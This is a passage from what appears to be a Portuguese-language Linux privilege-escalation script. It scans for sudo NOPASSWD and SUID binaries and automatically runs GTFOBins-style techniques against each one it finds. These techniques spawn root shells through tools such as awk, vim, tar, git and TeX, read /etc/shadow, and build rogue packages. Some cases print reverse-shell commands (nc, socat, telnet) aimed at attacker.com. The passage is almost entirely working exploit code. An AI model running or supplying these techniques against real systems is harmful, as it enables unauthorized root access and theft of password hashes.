            sudo "$paths" --textbox --scrolltext /etc/shadow 0 0
            ;;
        wish)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            exec /bin/sh <@stdin >@stdout 2>@stderr
            ;;
        xargs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -a /dev/null sh
            ;;
        xdg-user-dir)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" '}; /bin/sh #'
            ;;
        xdotool)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" exec --sync /bin/sh
            ;;
        xelatex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" -shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        xetex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
            ;;
        xmodmap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -v /etc/shadow
            ;;
        xmore)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        xpad)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        xxd)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" -r
            ;;
        xz)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" -d
            ;;
        yarn)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" exec /bin/sh
            ;;
        yash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        yum)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            TF=$(mktemp -d)
            echo 'id' > $TF/x.sh
            fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
            sudo "$paths" localinstall -y x-1.0-1.noarch.rpm
            ;;
        zathura)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            :! /bin/sh -c 'exec /bin/sh 0<&1'
            ;;
        zip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -u)
            sudo "$paths" $TF /etc/hosts -T -TT 'sh #' </dev/tty
            ;;
        zsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        zsoelim)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        zypper)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            cp /bin/sh $TF/zypper-x
            sudo PATH=$TF:$PATH "$paths" x
            ;;
        *)
            echo "[-] Comando sudo permitido: $paths → sem exploit automático registrado"
        ;;
    esac
done

read -p "Deseja executar a verificação de Limited SUIDs? (y/N): " resp
resp=${resp:-N} 
if [[ ! "$resp" =~ ^[Yy]$ ]]; then
   echo "[-] Verificação de Limited SUIDs ignorada."
   exit 0
fi

echo -e "\e[1;35m"
echo "[*] ------------- Limited SUID ------------"
echo "[*] Procurando Limited SUID do GTFOBins...."
echo "[*] ---------------------------------------"
echo -e "\e[0m"

LSUID=$(find / -perm -u=s -type f 2>/dev/null)
echo "Buscando..."
for Lpath in $LSUID; do
    LSbin=$(basename "$Lpath")

    case "$LSbin" in
        aria2c)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            COMMAND='id'
            TF=$(mktemp)
            echo "$COMMAND" > $TF
            chmod +x $TF
            "$Lpath" --on-download-error=$TF http://x
            ;;
        awk)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 'BEGIN {system("/bin/sh")}'
            ;;
        batcat)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --paging always /etc/profile
            !/bin/sh
            ;;
        byebug)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo 'system("/bin/sh")' > $TF
            "$Lpath" $TF
            continue
            ;;
        composer)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp -d)
            echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
            "$Lpath" --working-dir=$TF run-script x
            ;;
        dc)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e '!/bin/sh'
            ;;
        dvips)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            tex '\special{psfile="`/bin/sh 1>&0"}\end'
            "$Lpath" -R0 texput.dvi
            ;;
        ed)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            !/bin/sh
            ;;
        gawk)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 'BEGIN {system("/bin/sh")}'
            ;;
        ginsh)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            !/bin/sh
            ;;
        git)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            PAGER='sh -c "exec sh 0<&1"' "$Lpath" -p help
            ;;
        iftop)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            !/bin/sh
            ;;
        joe)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            ^K!/bin/sh
            ;;
        latex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        ldconfig)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "TF=$(mktemp -d)"
            echo "echo "$TF" > "$TF/conf""
            echo "# move malicious libraries in $TF"
            echo ""$Lpath" -f "$TF/conf""
            ;;
        lftp)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -c '!/bin/sh'
            ;;
        lua)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e 'os.execute("/bin/sh")'
            ;;
        lualatex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
            ;;
        luatex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -shell-escape '\directlua{os.execute("/bin/sh")}\end'
            ;;
        mawk)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 'BEGIN {system("/bin/sh")}'
            ;;
        mysql)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e '\! /bin/sh'
            ;;
        nano)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -s /bin/sh
            /bin/sh
            ^T
            ;;
        nawk)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 'BEGIN {system("/bin/sh")}'
            ;;
        nc)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "nc -e /bin/sh attacker.com 4444"
            ;;
        ncdu)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            b
            ;;
        nmap)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' > $TF
            "$Lpath" --script=$TF
            ;;
        octave)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            octave-cli --eval 'system("/bin/sh")'
            ;;
        pandoc)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' >$TF
            "$Lpath" -L $TF /dev/null
            ;;
        pdflatex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        pdftex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --shell-escape '\write18{/bin/sh}\end'
            ;;
        pic)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -U
            .PS
            sh X sh X
            ;;
        pico)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -s /bin/sh
            /bin/sh
            ^T
            ;;
        posh)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 
            ;;
        pry)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "pry"
            echo "system("/bin/sh")"
            ;;
        psftp)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            sudo "$Lpath"
            !/bin/sh
            ;;
        rake)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -p '`/bin/sh 1>&0`'
            ;;
        rpm | rpmquery)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --eval '%{lua:os.execute("/bin/sh")}'
            ;;
        rpmdb | rpmverify)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --eval '%(/bin/sh 1>&2)'
            ;;
        runscript)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo '! exec /bin/sh' >$TF
            "$Lpath" $TF
            ;;
        rview | rvim | view | vim | vimdiff)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -c ':lua os.execute("reset; exec sh")'
            ;;
        scp)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp)
            echo 'sh 0<&2 1>&2' > $TF
            chmod +x "$TF"
            "$Lpath" -S $TF a b:
            ;;
        scrot)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e /bin/sh
            ;;
        slsh)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -e 'system("/bin/sh")'
            ;;
        socat)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "socat tcp-connect:attacker.com:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane"
            ;;
        sqlite3)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" /dev/null '.shell /bin/sh'
            ;;
        tar)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
            ;;
        tasksh | tdbtool)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath"
            !/bin/sh
            ;;
        tex | xetex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --shell-escape '\write18{/bin/sh}\end'
            ;;
        tmate)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" -c /bin/sh
            ;;
        watch)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" 'reset; exec sh 1>&0 2>&0'
            ;;
        xelatex)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            "$Lpath" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        zip)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            TF=$(mktemp -u)
            "$Lpath" $TF /etc/hosts -T -TT 'sh #'
            sudo rm $TF
            ;;
        telnet)
            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
            echo "RHOST=attacker.com"
            echo "RPORT=12345"
            echo "./telnet $RHOST $RPORT"
            echo "^]"
            echo "!/bin/sh"
            ;;

        *)
            ;;
    esac
done
